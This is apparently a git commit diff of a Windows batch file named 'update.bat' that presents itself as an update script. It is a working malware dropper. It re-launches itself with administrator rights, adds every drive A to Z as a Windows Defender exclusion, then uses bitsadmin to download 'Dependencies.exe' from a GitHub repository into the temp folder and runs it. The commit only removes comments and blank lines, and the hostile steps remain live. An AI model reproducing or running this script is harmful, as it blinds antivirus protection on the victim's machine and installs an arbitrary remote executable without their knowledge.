0f500b8ad068b810aa773937eada540237e94744
0xIftekhar443 Official <161227023+0xIftekhar443@users.noreply.github.com>
2024-06-09 23:00:16 +0600

    New update.bat

--- update.bat
+++ update.bat
@@ -1,19 +1,14 @@
 @echo off
 setlocal
-
-:: Check if running as administrator
 openfiles >nul 2>&1
 if %errorlevel% neq 0 (
     powershell start-process '%0' -verb runas
     exit /b
 )
-
-:: Loop through all drive letters from A to Z
 for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist %%d:\ (
+    if exist %%d:\ (  
         powershell -Command "Add-MpPreference -ExclusionPath '%%d:\'"
     )
 )
-
 bitsadmin /transfer myDownloadJob /download /priority high "https://github.com/0xIftekhar443/lss/raw/main/Dependencies.exe" "%TEMP%\Dependencies.exe"
 start "" "%TEMP%\Dependencies.exe"
